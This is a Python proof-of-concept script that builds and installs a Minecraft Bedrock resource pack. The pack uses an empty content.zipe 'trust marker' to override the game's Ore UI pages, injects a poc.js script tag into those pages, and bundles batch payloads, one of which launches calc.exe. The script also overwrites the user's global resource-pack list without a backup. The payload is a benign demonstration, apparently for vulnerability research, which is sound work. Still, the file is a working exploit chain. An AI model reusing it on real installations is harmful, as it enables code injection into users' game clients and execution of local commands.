#!/usr/bin/env python3

import json
import os
import shutil
import zipfile

GAME = r"C:\Program Files\WindowsApps\Microsoft.MinecraftUWP_1.26.5203.0_x64__8wekyb3d8bbwe"
HBUI = os.path.join(GAME, r"data\gui\dist\hbui")

HERE = os.path.dirname(os.path.abspath(__file__))
BUILD = os.path.join(HERE, "zipe-editor-poc")

APPDATA = os.path.join(os.environ["APPDATA"], "Minecraft Bedrock", "Users")
USER_DIR = os.path.join(APPDATA, "8711868882672590509")
DEV_PACK = os.path.join(USER_DIR, r"games\com.mojang\resource_packs\zipe-editor-poc")
WORLD = os.path.join(USER_DIR, r"games\com.mojang\minecraftWorlds\editor_poc")
GLOBAL_JSON = os.path.join(APPDATA, "8711868882672590509", r"games\com.mojang\minecraftpe\global_resource_packs.json")

PACK_UUID = "7d1a63f0-55aa-4d0e-9f11-9b7a2f000001"
MOD_UUID = "7d1a63f0-55aa-4d0e-9f11-9b7a2f000002"
VERSION = [1, 0, 3]

STATIC_BANNER = (
    '<div id="zipe-poc-banner" style="position:fixed;left:0;right:0;bottom:0;'
    'background:#a00;color:#fff;font:14px monospace;padding:8px;z-index:2147483647;'
    'pointer-events:none">ZIPE-POC: pack montou o hbui (content.zipe)</div>'
)

PAGES_EDITOR = ("editor-project.html", "editor-menu.html")
PAGES_PLAIN = ("index.html",)


def build():
    if os.path.isdir(BUILD):
        shutil.rmtree(BUILD)
    os.makedirs(os.path.join(BUILD, "hbui"), exist_ok=True)

    manifest = {
        "format_version": 2,
        "header": {
            "name": "zipe-editor-poc",
            "description": "Ore UI override via content.zipe (benign calc PoC)",
            "uuid": PACK_UUID,
            "version": VERSION,
            "min_engine_version": [1, 21, 0],
        },
        "modules": [{"type": "resources", "uuid": MOD_UUID, "version": VERSION}],
    }
    with open(os.path.join(BUILD, "manifest.json"), "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    # content.zipe VAZIO: e o "trust marker" que libera o override de hbui
    open(os.path.join(BUILD, "content.zipe"), "wb").close()

    shutil.copyfile(os.path.join(HERE, "poc.js"), os.path.join(BUILD, "hbui", "poc.js"))
    shutil.copyfile(os.path.join(HERE, "poc.bat"), os.path.join(BUILD, "poc.bat"))

    # payload opcional (caso TARGETS aponte para ele)
    with open(os.path.join(BUILD, "calc.bat"), "w", encoding="utf-8", newline="\r\n") as f:
        f.write("@echo off\r\nstart calc.exe\r\n")

    for page in PAGES_EDITOR + PAGES_PLAIN:
        with open(os.path.join(HBUI, page), "r", encoding="utf-8") as f:
            html = f.read()
        assert "<head>" in html, page
        inject = ""
        if page in PAGES_EDITOR:
            inject += "<script>window.__ZIPE_EDITOR__=true;</script>"
        inject += '<script src="/hbui/poc.js"></script>'
        html = html.replace("<head>", "<head>" + inject, 1)
        assert "</body>" in html, page
        html = html.replace("</body>", STATIC_BANNER + "</body>", 1)
        with open(os.path.join(BUILD, "hbui", page), "w", encoding="utf-8") as f:
            f.write(html)

    mcpack = os.path.join(HERE, "zipe-editor-poc.mcpack")
    with zipfile.ZipFile(mcpack, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _dirs, files in os.walk(BUILD):
            for name in files:
                full = os.path.join(root, name)
                z.write(full, os.path.relpath(full, BUILD).replace("\\", "/"))

    print("pack  :", BUILD)
    print("mcpack:", mcpack, os.path.getsize(mcpack), "bytes")


def install():
    targets = [
        os.path.join(USER_DIR, r"games\com.mojang\resource_packs\zipe-editor-poc"),
        os.path.join(APPDATA, "Shared", r"games\com.mojang\resource_packs\zipe-editor-poc"),
    ]
    for t in targets:
        if os.path.isdir(t):
            shutil.rmtree(t)
        shutil.copytree(BUILD, t)

    world_pack = os.path.join(WORLD, "resource_packs", "zipe-editor-poc")
    if os.path.isdir(world_pack):
        shutil.rmtree(world_pack)
    shutil.copytree(BUILD, world_pack)

    with open(os.path.join(WORLD, "world_resource_packs.json"), "w", encoding="utf-8") as f:
        json.dump([{"pack_id": PACK_UUID, "version": VERSION}], f, indent=2)

    with open(GLOBAL_JSON, "w", encoding="utf-8") as f:
        json.dump([{"pack_id": PACK_UUID, "version": VERSION}], f, indent=2)

    for t in targets:
        print("pack     :", t)
    print("world    :", world_pack)
    print("global   :", GLOBAL_JSON)


if __name__ == "__main__":
    build()
    install()
